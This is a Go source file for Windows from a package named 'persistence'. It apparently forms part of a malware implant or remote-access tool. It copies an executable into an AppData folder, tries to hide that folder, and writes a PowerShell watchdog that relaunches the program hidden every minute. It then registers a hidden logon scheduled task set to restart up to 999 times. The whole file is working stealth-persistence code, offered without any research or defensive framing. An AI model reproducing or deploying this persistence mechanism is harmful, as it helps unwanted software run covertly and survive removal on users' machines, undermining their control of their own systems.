//go:build windows && persist_watchdog
// +build windows,persist_watchdog

package persistence

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"text/template"
	"bytes"
)

func init() {
	persistInstallFns = append(persistInstallFns, installWatchdog)
	persistUninstallFns = append(persistUninstallFns, uninstallWatchdog)
}

const watchdogScriptTemplate = `
$target = '{{.TargetPath}}'
$taskName = '{{.TaskName}}'
while ($true) {
    $proc = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $target }
    if (-not $proc) {
        Start-Process -FilePath $target -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
    Start-Sleep -Seconds 60
}
`

func installWatchdog(exePath string) error {
	targetPath, err := getAppDataTargetPath()
	if err != nil {
		return err
	}
	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("watchdog: failed to create dir: %w", err)
	}
	tryHideDirectory(dir)
	if !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
		if err := replaceExecutable(exePath, targetPath); err != nil {
			return err
		}
	}

	taskName := deriveTaskName(targetPath) + "_wd"
	scriptPath := filepath.Join(dir, executablePrefix()+"wd.ps1")

	tmpl, err := template.New("wd").Parse(watchdogScriptTemplate)
	if err != nil {
		return fmt.Errorf("watchdog: template parse: %w", err)
	}
	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, map[string]string{
		"TargetPath": strings.ReplaceAll(targetPath, "'", "''"),
		"TaskName":   taskName,
	}); err != nil {
		return fmt.Errorf("watchdog: template execute: %w", err)
	}
	if err := os.WriteFile(scriptPath, buf.Bytes(), 0600); err != nil {
		return fmt.Errorf("watchdog: failed to write script: %w", err)
	}

	safe := strings.ReplaceAll(scriptPath, "'", "''")
	script := fmt.Sprintf(
		`$a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -NonInteractive -WindowStyle Hidden -File "%s"'; `+
			`$t = New-ScheduledTaskTrigger -AtLogOn; `+
			`$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1); `+
			`$p = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited; `+
			`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger $t -Settings $s -Principal $p -Force | Out-Null`,
		safe, taskName)
	return runPowerShell(script)
}

func uninstallWatchdog() error {
	prefix := executablePrefix()
	return runPowerShell(
		`Get-ScheduledTask -ErrorAction SilentlyContinue | ` +
			`Where-Object { $_.TaskName -like '` + prefix + `*_wd' } | ` +
			`Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue`)
}
